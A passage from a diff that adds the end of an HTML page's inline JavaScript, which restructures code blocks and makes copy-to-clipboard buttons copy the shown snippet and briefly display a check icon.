+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
